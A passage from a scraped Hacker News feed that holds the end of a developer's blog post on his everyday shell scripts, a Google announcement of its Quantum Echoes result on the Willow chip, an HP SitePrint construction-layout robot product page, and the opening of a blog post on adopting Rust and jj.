    &lt;p&gt;&lt;code&gt;u+ 2025&lt;/code&gt; returns &lt;code&gt;Ã±, LATIN SMALL LETTER N WITH TILDE&lt;/code&gt;. A quick way to do a lookup of a Unicode string. I donât use this one that often&amp;amp;mldr;probably about once a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;snippets foo&lt;/code&gt; cats &lt;code&gt;~/.config/evanhahn-snippets/foo&lt;/code&gt;. I use &lt;code&gt;snippet arrow&lt;/code&gt; for &lt;code&gt;â&lt;/code&gt;, &lt;code&gt;snippet recruiter&lt;/code&gt; for a quick ânot interestedâ response to job recruiters, &lt;code&gt;snippet lorem&lt;/code&gt; to print a âLorem ipsumâ block, and a few others. I probably use one or two of these a week.&lt;/p&gt;
    &lt;head rend="h2"&gt;REPL launchers&lt;/head&gt;
    &lt;p&gt;Inspired by Rubyâs built-in &lt;code&gt;irb&lt;/code&gt; REPL, Iâve made:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;iclj&lt;/code&gt;to start a Clojure REPL&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;ijs&lt;/code&gt;to start a Deno REPL (or a Node REPL when Deno is missing)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;iphp&lt;/code&gt;to start a PHP REPL&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;ipy&lt;/code&gt;to start a Python REPL&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;isql&lt;/code&gt;to start a SQLite shell (an alias for&lt;code&gt;sqlite3 :memory:&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Dates and times&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;hoy&lt;/code&gt; prints the current date in ISO format, like &lt;code&gt;2020-04-20&lt;/code&gt;. I use this all the time because I like to prefix files with the current date.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;timer 10m&lt;/code&gt; starts a timer for 10 minutes, then (1) plays an audible ring sound (2) sends an OS notification (see &lt;code&gt;notify&lt;/code&gt; below). I often use &lt;code&gt;bb timer 5m&lt;/code&gt; to start a 5 minute timer in the background (see &lt;code&gt;bb&lt;/code&gt; below). I use this almost every day as a useful way to keep on track of time.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;rn&lt;/code&gt; prints the current time and date using &lt;code&gt;date&lt;/code&gt; and &lt;code&gt;cal&lt;/code&gt;. I probably use it once a week. It prints something like this:&lt;/p&gt;
    &lt;code&gt; 4:20PM on Wednesday, October 22, 2025

   September 2025
Su Mo Tu We Th Fr Sa
    1  2  3  4  5  6
 7  8  9 10 11 12 13
14 15 16 17 18 19 20
21 22 23 24 25 26 27
28 29 30
&lt;/code&gt;
    &lt;head rend="h2"&gt;Audio and video and pictures&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;ocr my_image.png&lt;/code&gt; extracts text from an image and prints it to stdout. It only works on macOS, unfortunately, but I want to fix that. (I wrote a post about this script.)&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;boop&lt;/code&gt; (an alias, not a shell script) makes a happy sound if the previous command succeeded and a sad sound otherwise. I do things like &lt;code&gt;run_the_tests ; boop&lt;/code&gt; which will tell me, audibly, whether the tests succeed. Itâs also helpful for long-running commands, because you get a little alert when theyâre done. I use this all the time.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;sfx foo&lt;/code&gt; basically just plays &lt;code&gt;~/.config/evanhahn-sfx/foo.ogg&lt;/code&gt;. Used in &lt;code&gt;boop&lt;/code&gt; and &lt;code&gt;timer&lt;/code&gt; above.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;tunes&lt;/code&gt; uses &lt;code&gt;mpv&lt;/code&gt; to play audio from a file. I use this all the time, running &lt;code&gt;tunes --shuffle ~/music&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;pix&lt;/code&gt; uses &lt;code&gt;mpv&lt;/code&gt; to show a picture. I use this a few times a week to look at photos.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;radio&lt;/code&gt; is a little wrapper around some of my favorite internet radio stations. &lt;code&gt;radio lofi&lt;/code&gt; and &lt;code&gt;radio salsa&lt;/code&gt; are two of my favorites. I use this a few times a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;speak&lt;/code&gt; reads from stdin, removes all Markdown formatting, and pipes it to a text-to-speech system (&lt;code&gt;say&lt;/code&gt; on macOS and &lt;code&gt;espeak-ng&lt;/code&gt; on Linux). I like using text-to-speech when I canât proofread out loud. I use this a few times a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;shrinkvid&lt;/code&gt; is an &lt;code&gt;ffmpeg&lt;/code&gt; wrapper that compresses a video a bit. I use this about once a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;removeexif&lt;/code&gt; removes EXIF data from JPEGs. I donât use this much, in part because it doesnât remove EXIF data from other file formats like PNGs&amp;amp;mldr;but I keep it around because I hope to expand this one day.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;tuivid&lt;/code&gt; is one I almost never use, but you can use it to watch videos in the terminal. Itâs cursed and I love it, even if I never use it.&lt;/p&gt;
    &lt;head rend="h2"&gt;Process management&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;each&lt;/code&gt; is my answer to &lt;code&gt;xargs&lt;/code&gt; and &lt;code&gt;find ... -exec&lt;/code&gt;, which I find hard to use. For example, &lt;code&gt;ls | each 'du -h {}'&lt;/code&gt; runs &lt;code&gt;du -h&lt;/code&gt; on every file in a directory. I use this infrequently but I always mess up &lt;code&gt;xargs&lt;/code&gt; so this is a nice alternative.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;running foo&lt;/code&gt; is like &lt;code&gt;ps aux | grep foo&lt;/code&gt; but much easier (for me) to readâjust the PID (highlighted in purple) and the command.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;murder foo&lt;/code&gt; or &lt;code&gt;murder 1234&lt;/code&gt; is a wrapper around &lt;code&gt;kill&lt;/code&gt; that sends &lt;code&gt;kill -15 $PID&lt;/code&gt;, waits a little, then sends &lt;code&gt;kill -2&lt;/code&gt;, waits and sends &lt;code&gt;kill -1&lt;/code&gt;, waits before finally sending &lt;code&gt;kill -9&lt;/code&gt;. If I want a program to stop, I want to ask it nicely before getting more aggressive. I use this a few times a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;waitfor $PID&lt;/code&gt; waits for a PID to exit before continuing. It also keeps the system from going to sleep. I use this about once a month to do things like:&lt;/p&gt;
    &lt;code&gt;# I want to start something only after another process finishes
waitfor 1234 ; something_else

# I started a long-running process and want to know when it's done
waitfor 1234 ; notify 'process 1234 is done'
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;bb my_command&lt;/code&gt; is like &lt;code&gt;my_command &amp;amp;&lt;/code&gt; but it really really runs it in the background. Youâll never hear from that program again. Itâs useful when you want to start a daemon or long-running process you truly donât care about. I use &lt;code&gt;bb ollama serve&lt;/code&gt; and &lt;code&gt;bb timer 5m&lt;/code&gt; most often. I use this about once a day.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;prettypath&lt;/code&gt; prints &lt;code&gt;$PATH&lt;/code&gt; but with newlines separating entries, which makes it much easier to read. I use this pretty rarelyâmostly just when Iâm debugging a &lt;code&gt;$PATH&lt;/code&gt; issue, which is unusualâbut Iâm glad I have it when I do.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;tryna my_command&lt;/code&gt; runs &lt;code&gt;my_command&lt;/code&gt; until it succeeds. &lt;code&gt;trynafail my_command&lt;/code&gt; runs &lt;code&gt;my_command&lt;/code&gt; until it fails. I donât use this much, but itâs useful for various things. &lt;code&gt;tryna wget ...&lt;/code&gt; will keep trying to download something. &lt;code&gt;trynafail npm test&lt;/code&gt; will stop once my tests start failing.&lt;/p&gt;
    &lt;head rend="h2"&gt;Quick references&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;emoji&lt;/code&gt; is my emoji lookup helper. For example, &lt;code&gt;emoji cool&lt;/code&gt; prints the following:&lt;/p&gt;
    &lt;code&gt;ð
ð
ð
ðª­
ð
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;httpstatus&lt;/code&gt; prints all HTTP statuses. &lt;code&gt;httpstatus 204&lt;/code&gt; prints &lt;code&gt;204 No Content&lt;/code&gt;. As a web developer, I use this a few times a month, instead of looking it up online.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;alphabet&lt;/code&gt; just prints the English alphabet in upper and lowercase. I use this surprisingly often (probably about once a month). It literally just prints this:&lt;/p&gt;
    &lt;code&gt;abcdefghijklmnopqrstuvwxyz
ABCDEFGHIJKLMNOPQRSTUVWXYZ
&lt;/code&gt;
    &lt;head rend="h2"&gt;System management&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;theme 0&lt;/code&gt; changes my whole system to dark mode. &lt;code&gt;theme 1&lt;/code&gt; changes it to light mode. It doesnât just change the OS themeâit also changes my Vim, Tmux, and terminal themes. I use this at least once a day.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;sleepybear&lt;/code&gt; puts my system to sleep, and works on macOS and Linux. I use this a few times a week.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;ds-destroy&lt;/code&gt; recursively deletes all &lt;code&gt;.DS_Store&lt;/code&gt; files in a directory. I hate that macOS clutters directories with these files! I donât use this often, but Iâm glad I have it when I need it.&lt;/p&gt;
    &lt;head rend="h2"&gt;Grab bag&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;catbin foo&lt;/code&gt; is basically &lt;code&gt;cat "$(which foo)"&lt;/code&gt;. Useful for seeing the source code of a file in your path (used it for writing up this post, for example!). I use this a few times a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;notify&lt;/code&gt; sends an OS notification. Itâs used in several of my other scripts (see above). I also do something like this about once a month:&lt;/p&gt;
    &lt;code&gt;run_some_long_running_process ; notify 'all done'
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;uuid&lt;/code&gt; prints a v4 UUID. I use this about once a month.&lt;/p&gt;
    &lt;head rend="h2"&gt;What about your scripts?&lt;/head&gt;
    &lt;p&gt;These are just scripts I use a lot. I hope some of them are useful to you!&lt;/p&gt;
    &lt;p&gt;If you liked this post, you might like âWhy âaliasâ is my last resort for aliasesâ and âA decade of dotfilesâ.&lt;/p&gt;
    &lt;p&gt;Oh, and contact me if you have any scripts you think Iâd like.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://evanhahn.com/scripts-i-wrote-that-i-use-all-the-time/"/><published>2025-10-22T14:53:54+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45670443</id><title>Willow quantum chip demonstrates verifiable quantum advantage on hardware</title><updated>2025-10-23T06:15:50.074912+00:00</updated><content>&lt;doc fingerprint="f11f21b7850484f9"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Our Quantum Echoes algorithm is a big step toward real-world applications for quantum computing&lt;/head&gt;
    &lt;p&gt;Editorâs note: Today, weâre announcing research that shows â for the first time in history â that a quantum computer can successfully run a verifiable algorithm on hardware, surpassing even the fastest classical supercomputers (13,000x faster). It can compute the structure of a molecule, and paves a path towards real-world applications. Todayâs advance builds on decades of work, and six years of major breakthroughs. Back in 2019, we demonstrated that a quantum computer could solve a problem that would take the fastest classical supercomputer thousands of years. Then, late last year (2024), our new Willow quantum chip showed how to dramatically suppress errors, solving a major issue that challenged scientists for nearly 30 years. Todayâs breakthrough moves us much closer to quantum computers that can drive major discoveries in areas like medicine and materials science.&lt;/p&gt;
    &lt;p&gt;Imagine youâre trying to find a lost ship at the bottom of the ocean. Sonar technology might give you a blurry shape and tell you, "There's a shipwreck down there." But what if you could not only find the ship but also read the nameplate on its hull?&lt;/p&gt;
    &lt;p&gt;That's the kind of unprecedented precision we've just achieved with our Willow quantum chip. Today, weâre announcing a major algorithmic breakthrough that marks a significant step towards a first real-world application. Just published in Nature, we have demonstrated the first-ever verifiable quantum advantage running the out-of-order time correlator (OTOC) algorithm, which we call Quantum Echoes.&lt;/p&gt;
    &lt;p&gt;Quantum Echoes can be useful in learning the structure of systems in nature, from molecules to magnets to black holes, and weâve demonstrated it runs 13,000 times faster on Willow than the best classical algorithm on one of the worldâs fastest supercomputers.&lt;/p&gt;
    &lt;p&gt;In a separate, proof-of-principle experiment Quantum computation of molecular geometry via many-body nuclear spin echoes (to be posted on arXiv later today), we showed how our new technique â a âmolecular rulerâ â can measure longer distances than todayâs methods, using data from Nuclear Magnetic Resonance (NMR) to gain more information about chemical structure.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Quantum Echoes algorithm, a verifiable quantum advantage&lt;/head&gt;
    &lt;p&gt;This is the first time in history that any quantum computer has successfully run a verifiable algorithm that surpasses the ability of supercomputers. Quantum verifiability means the result can be repeated on our quantum computer â or any other of the same caliber â to get the same answer, confirming the result. This repeatable, beyond-classical computation is the basis for scalable verification, bringing quantum computers closer to becoming tools for practical applications.&lt;/p&gt;
    &lt;p&gt;Our new technique works like a highly advanced echo. We send a carefully crafted signal into our quantum system (qubits on Willow chip), perturb one qubit, then precisely reverse the signalâs evolution to listen for the "echo" that comes back.&lt;/p&gt;
    &lt;p&gt;This quantum echo is special because it gets amplified by constructive interference â a phenomenon where quantum waves add up to become stronger. This makes our measurement incredibly sensitive.&lt;/p&gt;
    &lt;p&gt;This diagram shows the four-step process for creating a quantum echo on our 105-qubit array: run operations forward, perturb one qubit, run operations backward, and measure the result. The signal's overlap reveals how a disturbance spreads across the Willow chip.&lt;/p&gt;
    &lt;p&gt;This implementation of the Quantum Echoes algorithm is enabled by the advances in quantum hardware of our Willow chip. Last year, Willow proved its power with our Random Circuit Sampling benchmark, a test designed to measure maximum quantum state complexity. The Quantum Echoes algorithm represents a new class of challenge because it models a physical experiment. This means this algorithm tests not only for complexity, but also for precision in the final calculation. This is why we call it âquantum verifiable,â meaning the result can be cross-benchmarked and verified by another quantum computer of similar quality. To deliver both precision and complexity, the hardware must have two key traits: extremely low error rates and high-speed operations.&lt;/p&gt;
    &lt;head rend="h3"&gt;Towards real world application&lt;/head&gt;
    &lt;p&gt;Quantum computers will be instrumental in modeling quantum mechanical phenomena, such as the interactions of atoms and particles and the structure (or shape) of molecules. One of the tools scientists use to understand chemical structure is Nuclear Magnetic Resonance (NMR), the same science behind MRI technology. NMR acts as a molecular microscope, powerful enough to let us see the relative position of atoms, which helps us understand a moleculeâs structure. Modeling moleculesâ shape and dynamics is foundational in chemistry, biology and materials science, and advances that help us do this better underpin progress in fields ranging from biotechnology to solar energy to nuclear fusion.&lt;/p&gt;
    &lt;p&gt;In a proof-of-principle experiment in partnership with The University of California, Berkeley, we ran the Quantum Echoes algorithm on our Willow chip to study two molecules, one with 15 atoms and another with 28 atoms, to verify this approach. The results on our quantum computer matched those of traditional NMR, and revealed information not usually available from NMR, which is a crucial validation of our approach.&lt;/p&gt;
    &lt;p&gt;Just as the telescope and the microscope opened up new, unseen worlds, this experiment is a step toward a âquantum-scopeâ capable of measuring previously unobservable natural phenomena. Quantum computing-enhanced NMR could become a powerful tool in drug discovery, helping determine how potential medicines bind to their targets, or in materials science for characterizing the molecular structure of new materials like polymers, battery components or even the materials that comprise our quantum bits (qubits).&lt;/p&gt;
    &lt;head rend="h3"&gt;Whatâs next&lt;/head&gt;
    &lt;p&gt;This demonstration of the first-ever verifiable quantum advantage with our Quantum Echoes algorithm marks a significant step toward the first real-world applications of quantum computing.&lt;/p&gt;
    &lt;p&gt;As we scale up towards a full-scale, error-corrected quantum computer, we expect many more such useful real-world applications to be invented. Now, weâre focused on achieving Milestone 3 on our quantum hardware roadmap, a long-lived logical qubit.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blog.google/technology/research/quantum-echoes-willow-verifiable-quantum-advantage/"/><published>2025-10-22T15:16:19+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45672235</id><title>HP SitePrint</title><updated>2025-10-23T06:15:49.221078+00:00</updated><content>&lt;doc fingerprint="836d9ee3ef7461e2"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Breakthrough layout efficiency&lt;/head&gt;
    &lt;p&gt;HPâs printing knowhow and robotics technology combine to accelerate projectsâminimising errors or redos.&lt;/p&gt;
    &lt;head rend="h4"&gt;Improve on site productivity&lt;/head&gt;
    &lt;p&gt;Reduce layout and floor deviation marking costs with autonomous technology. Save time with printed text to enrich info on-site, and free up expertise to add value elsewhere.&lt;/p&gt;
    &lt;head rend="h4"&gt;Get accurate layouts&lt;/head&gt;
    &lt;p&gt;Complete projects accurately. Count on precise implementation of complex layouts and floor levelness.&lt;/p&gt;
    &lt;head rend="h4"&gt;Easy to use&lt;/head&gt;
    &lt;p&gt;Handle projects seamlessly with an all-in-one construction layout and floor deviation marking management solution. Pack the portable device between sites and go.&lt;/p&gt;
    &lt;head rend="h3"&gt;Unlock next-level precision with the new HP SitePrint SMR prism, HP SitePrintâs most precise prism&lt;/head&gt;
    &lt;p&gt;Get enhanced layout and floor deviation marking accuracy supporting you in confidently delivering jobs that demand high precision.&lt;/p&gt;
    &lt;p&gt;Layout accuracy1 up to -/+ 3/32 inch (+/- 2mm EMEA versions)&lt;/p&gt;
    &lt;p&gt;Floor deviation marking precision1 up to +/- 1/32 inch (+/-0.8mm EMEA versions)&lt;/p&gt;
    &lt;p&gt;Optimal alignment with the total station&lt;/p&gt;
    &lt;head rend="h4"&gt;Print points up to 30% faster2&lt;/head&gt;
    &lt;head rend="h5"&gt;Upgraded navigation speed and strengthened robot braking capabilities to ensure fast operations onsite.&lt;/head&gt;
    &lt;head rend="h4"&gt;Refined obstacle avoidance&lt;/head&gt;
    &lt;head rend="h5"&gt;A new advanced depth camera integration helps gain comprehensive spatial representations of the environment. Map unforeseen onsite obstacles, bringing incremental robot autonomy.&lt;/head&gt;
    &lt;head rend="h4"&gt;Real-time route adjustments&lt;/head&gt;
    &lt;head rend="h5"&gt;The new HP-engineered Smart Navigation System processes obstacle data captured by the depth camera, enabling seamless navigation around unexpected hindrances.&lt;/head&gt;
    &lt;head rend="h4"&gt;Enhanced uninterrupted operation&lt;/head&gt;
    &lt;head rend="h5"&gt;Navigate with confidence. The new shadowing feature prevents the robot from venturing into areas without Robotic Total Station line-of-sight, elevating productivity.&lt;/head&gt;
    &lt;head rend="h5"&gt;Batson-Cook Construction gets a 34% cost reduction in self-perform interior walls layout at a medical center&lt;/head&gt;
    &lt;head rend="h5"&gt;PCL reduces cost by 86% on interior curved lines layout at Vancouver airport&lt;/head&gt;
    &lt;head rend="h5"&gt;Winvic executes full site layout 3 times faster at a residential building&lt;/head&gt;
    &lt;head rend="h5"&gt;ArtLab Studios 10x more productive for tradeshow layout&lt;/head&gt;
    &lt;p&gt;How HP SitePrint works&lt;/p&gt;
    &lt;p&gt;Learn, step by step, how this robust, all-in-one construction layout management solution can easily handle end-to-end project processes.&lt;/p&gt;
    &lt;p&gt;How HP SitePrint works&lt;/p&gt;
    &lt;p&gt;Learn, step by step, how this robust, all-in-one construction layout management solution can easily handle end-to-end project processes.&lt;/p&gt;
    &lt;head rend="h2"&gt;Working with market leaders&lt;/head&gt;
    &lt;p&gt; HP is partnering with the main players of the positioning industry to be compatible with their Robotic Total Stations.&lt;lb/&gt; HP will continue working to extend RTS compatibility with the main brands and solutions in the market.&lt;/p&gt;
    &lt;p&gt;HP and Leica Geosystems, part of Hexagon, have collaborated to integrate HP SitePrint with the Leica TS16 and TS60, Leica iCON iCR80 and Leica iCON iCR70 Robotic Total Stations.&lt;/p&gt;
    &lt;p&gt;HP and Topcon have collaborated to integrate HP SitePrint with the Topcon Layout Navigator (LN-150), Topcon GT-600, and Topcon GT-1200.&lt;/p&gt;
    &lt;p&gt;HP and Trimble have collaborated to integrate HP SitePrint with the Trimble RTS 573 and Trimble S9.&lt;/p&gt;
    &lt;head rend="h2"&gt;Enjoy a pay as you go model&lt;/head&gt;
    &lt;p&gt;No matter how big or small your business is. HP SitePrint has bundled a comprehensive support contract into a pay as you go usage rate, so you only pay for what you use.&lt;/p&gt;
    &lt;head rend="h2"&gt;Inks&lt;/head&gt;
    &lt;p&gt;Large ink portfolio, supportinga wide range of applications&lt;/p&gt;
    &lt;head rend="h2"&gt;Support&lt;/head&gt;
    &lt;p&gt;Unlimited support included&lt;/p&gt;
    &lt;head rend="h2"&gt;Repairs&lt;/head&gt;
    &lt;p&gt;Unlimited repairs are included and next-business-day unit swap when needed&lt;/p&gt;
    &lt;head rend="h2"&gt;Software&lt;/head&gt;
    &lt;p&gt;New cloud and user interface updates&lt;/p&gt;
    &lt;head rend="h2"&gt;Firmware&lt;/head&gt;
    &lt;p&gt;New firmware updates&lt;/p&gt;
    &lt;head rend="h2"&gt;Autonomous construction site layout&lt;/head&gt;
    &lt;head rend="h2"&gt;Up to 10x productivity gains&lt;/head&gt;
    &lt;head rend="h2"&gt;Obstacle avoidance&lt;/head&gt;
    &lt;head rend="h2"&gt;High accuracy&lt;/head&gt;
    &lt;head rend="h2"&gt; Cloud-based&lt;lb/&gt; management &lt;/head&gt;
    &lt;head rend="h2"&gt;Intricate arcs and circumferences&lt;/head&gt;
    &lt;head rend="h2"&gt;Compact design for easy transport&lt;/head&gt;
    &lt;p&gt;HP SitePrint has been recognized by BuiltWorlds as one of their Robotics Top 50 List for the second consecutive year (2024 &amp;amp; 2025).&lt;/p&gt;
    &lt;p&gt;HP SitePrint has been awarded, by the Innovative Product Awards (IPAs), as one of the 2023 Expertâs Choice for disruptive innovations.&lt;/p&gt;
    &lt;head rend="h2"&gt;European Union cofinanced project â NextGenerationEU&lt;/head&gt;
    &lt;head rend="h3"&gt;Footnotes and disclaimers&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Layout accuracy tolerance of Â±3/32 in (Â±2 mm) and floor level accuracy tolerance of Â±1/32 in (Â±0.8 mm) on average, when operating at distances between 15.4 ft and 98.4 ft (5 m and 30 m), using a high-accuracy setup with the HP SitePrint SMR Prism, High Accuracy Print Mode, and a 1â³ Total Station (tested with Leica TS16/60 1â³, Topcon GT1201 1â³, and Trimble S9 1â³).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Productivity improvements of up to 30% are based on comparisons with the performance of the previous software version, VP2.0. These results were obtained from internal tests, where SitePrint printed CAD files under average conditions representative of real user plots across various applications. Actual productivity gains may vary depending on specific customer applications and the unique characteristics of each job. For MEP use case CAD files, the productivity increase exceeds 30%, while for interior wall layouts, the increase is 8%.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Select Your Country/Region and Language&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Africa&lt;/item&gt;
      &lt;item&gt;Afrique&lt;/item&gt;
      &lt;item&gt;AmÃ©rica Central&lt;/item&gt;
      &lt;item&gt;Argentina&lt;/item&gt;
      &lt;item&gt;Asia Pacific&lt;/item&gt;
      &lt;item&gt;Australia&lt;/item&gt;
      &lt;item&gt;Bangladesh&lt;/item&gt;
      &lt;item&gt;BelgiÃ«&lt;/item&gt;
      &lt;item&gt;Belgique&lt;/item&gt;
      &lt;item&gt;Bolivia&lt;/item&gt;
      &lt;item&gt;Brasil&lt;/item&gt;
      &lt;item&gt;Canada&lt;/item&gt;
      &lt;item&gt;Canada - FranÃ§ais&lt;/item&gt;
      &lt;item&gt;Caribbean&lt;/item&gt;
      &lt;item&gt;ÄeskÃ¡ republika&lt;/item&gt;
      &lt;item&gt;Chile&lt;/item&gt;
      &lt;item&gt;Colombia&lt;/item&gt;
      &lt;item&gt;Danmark&lt;/item&gt;
      &lt;item&gt;Deutschland&lt;/item&gt;
      &lt;item&gt;Ecuador&lt;/item&gt;
      &lt;item&gt;Eesti&lt;/item&gt;
      &lt;item&gt;EspaÃ±a&lt;/item&gt;
      &lt;item&gt;France&lt;/item&gt;
      &lt;item&gt;Hong Kong SAR&lt;/item&gt;
      &lt;item&gt;Hrvatska&lt;/item&gt;
      &lt;item&gt;India&lt;/item&gt;
      &lt;item&gt;Indonesia&lt;/item&gt;
      &lt;item&gt;Ireland&lt;/item&gt;
      &lt;item&gt;Italia&lt;/item&gt;
      &lt;item&gt;Latvija&lt;/item&gt;
      &lt;item&gt;Lietuva&lt;/item&gt;
      &lt;item&gt;MagyarorszÃ¡g&lt;/item&gt;
      &lt;item&gt;Malaysia&lt;/item&gt;
      &lt;item&gt;MÃ©xico&lt;/item&gt;
      &lt;item&gt;Middle East&lt;/item&gt;
      &lt;item&gt;Nederland&lt;/item&gt;
      &lt;item&gt;New Zealand&lt;/item&gt;
      &lt;item&gt;Nigeria&lt;/item&gt;
      &lt;item&gt;Norge&lt;/item&gt;
      &lt;item&gt;Ãsterreich&lt;/item&gt;
      &lt;item&gt;Pakistan&lt;/item&gt;
      &lt;item&gt;Paraguay&lt;/item&gt;
      &lt;item&gt;PerÃº&lt;/item&gt;
      &lt;item&gt;Philippines&lt;/item&gt;
      &lt;item&gt;Polska&lt;/item&gt;
      &lt;item&gt;Portugal&lt;/item&gt;
      &lt;item&gt;Puerto Rico&lt;/item&gt;
      &lt;item&gt;RomÃ¢nia&lt;/item&gt;
      &lt;item&gt;Saudi Arabia&lt;/item&gt;
      &lt;item&gt;Singapore&lt;/item&gt;
      &lt;item&gt;Slovenija&lt;/item&gt;
      &lt;item&gt;Slovensko&lt;/item&gt;
      &lt;item&gt;South Africa&lt;/item&gt;
      &lt;item&gt;Sri Lanka&lt;/item&gt;
      &lt;item&gt;Suisse&lt;/item&gt;
      &lt;item&gt;Suomi&lt;/item&gt;
      &lt;item&gt;Sverige&lt;/item&gt;
      &lt;item&gt;Switzerland&lt;/item&gt;
      &lt;item&gt;TÃ¼rkiye&lt;/item&gt;
      &lt;item&gt;United Kingdom&lt;/item&gt;
      &lt;item&gt;United States&lt;/item&gt;
      &lt;item&gt;Uruguay&lt;/item&gt;
      &lt;item&gt;Venezuela&lt;/item&gt;
      &lt;item&gt;Viá»t Nam&lt;/item&gt;
      &lt;item&gt;ÎÎ»Î»Î¬Î´Î±&lt;/item&gt;
      &lt;item&gt;ÐÑÐ»Ð³Ð°ÑÐ¸Ñ&lt;/item&gt;
      &lt;item&gt;ÐÐ°Ð·Ð°ÑÑÑÐ°Ð½&lt;/item&gt;
      &lt;item&gt;Ð¡ÑÐ±Ð¸ÑÐ°&lt;/item&gt;
      &lt;item&gt;Ð£ÐºÑÐ°ÑÐ½Ð°&lt;/item&gt;
      &lt;item&gt;××©×¨××&lt;/item&gt;
      &lt;item&gt;Ø§ÙØ´Ø±Ù Ø§ÙØ£ÙØ³Ø·&lt;/item&gt;
      &lt;item&gt;Ø§ÙÙÙÙÙØ© Ø§ÙØ¹Ø±Ø¨ÙØ© Ø§ÙØ³Ø¹ÙØ¯ÙØ©&lt;/item&gt;
      &lt;item&gt;à¹à¸à¸¢&lt;/item&gt;
      &lt;item&gt;ä¸­åäººæ°å±åå½&lt;/item&gt;
      &lt;item&gt;èºç£ å°å&lt;/item&gt;
      &lt;item&gt;æ¥æ¬&lt;/item&gt;
      &lt;item&gt;é¦æ¸¯ç¹å¥è¡æ¿å&lt;/item&gt;
      &lt;item&gt;íêµ­&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Â©2025 HP Development Company, L.P. The information contained herein is subject to change without notice.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.hp.com/us-en/printers/site-print/layout-robot.html"/><published>2025-10-22T17:18:33+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45672280</id><title>I see a future in jj</title><updated>2025-10-23T06:15:48.954076+00:00</updated><content>&lt;doc fingerprint="956b115731f621bc"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;I see a future in jj&lt;/head&gt;
    &lt;p&gt;In December of 2012, I was home for Christmas, reading Hacker News. And thatâs when I saw âRust 0.5 released."" Iâm a big fan of programming languages, so I decided to check it out. At the time, I was working on Ruby and Rails, but in college, I had wanted to focus on compilers, and my friends were all very much into systems stuff. So I decided to give Rust a try.&lt;/p&gt;
    &lt;p&gt;And I liked it! But, for other reasons I wonât get into here, I was thinking about a lot of things in that moment. I was looking to shake things up a bit. So I asked myself: is Rust going to be A Thing?&lt;/p&gt;
    &lt;head rend="h2"&gt;Why I chose Rust&lt;/head&gt;
    &lt;p&gt;So, I thought about it. What does a programming language need to be successful? It needs some sort of market fit. It needs to have people willing to work on it, as bringing a new language into the world is a lot of work. And it needs users.&lt;/p&gt;
    &lt;p&gt;When I considered all of these things, hereâs what I saw with Rust:&lt;/p&gt;
    &lt;p&gt;Market fit: there was basically no credible alternatives to C and C++. I had been involved in the D community a bit, but it was clear that it wasnât going to take off. Go was a few years old, and hit 1.0 earlier that year, but for the kinds of work that C and C++ are uniquely able to do, I saw the same problem that I did with D: garbage collection. This doesnât mean Go isnât a good language, or that itâs not popular, but I didnât see it as being able to credibly challenge C and C++ in their strongholds. Rust, on the other hand, had a novel approach to these problems: memory safety without garbage collection. Now, I also need to mention that Rust back in those days was much closer to Go than it even is today, but again, I had just learned about it for a few hours, I didnât really have a deep understanding of it yet. If I had, I actually might have also dismissed it as well, as it wasnât really GC that was the issue, but a significant runtime. But again: I hadnât really come to that understanding yet. Point is: low-level programming was a space where there hadnât been much innovation in a very long time, and I thought that meant that Rust had a chance. Check.&lt;/p&gt;
